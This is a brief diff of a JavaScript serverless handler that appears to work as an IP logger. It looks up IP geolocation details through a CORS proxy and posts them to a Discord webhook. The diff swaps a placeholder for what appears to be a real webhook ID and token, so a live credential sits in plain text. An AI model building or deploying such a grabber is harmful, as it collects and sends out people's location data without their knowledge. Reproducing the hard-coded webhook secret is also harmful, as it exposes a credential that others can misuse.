@@ -1,5 +1,5 @@
 export default async function handler(req, res) {
-  const ipapiRes = await fetch('https://ipapi.co/json/');
+  const ipapiRes = await fetch('https://corsproxy.io/?url=https://ipapi.co/json/');
   const data = await ipapiRes.json();
 
   const formattedData = `**IP:** ${data.ip}
@@ -19,7 +19,7 @@ export default async function handler(req, res) {
 **Timezone:** ${data.timezone}
 **Currency:** ${data.currency}`;
 
-  await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+  await fetch('https://discord.com/api/webhooks/1406307118017019996/8xYGRPq-zG-_y-rzWSt4QpKAdczf5TOml2w6iH05j7T3knyHtOxQhCPZ-Zxi1AtEG70n', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ content: formattedData }),
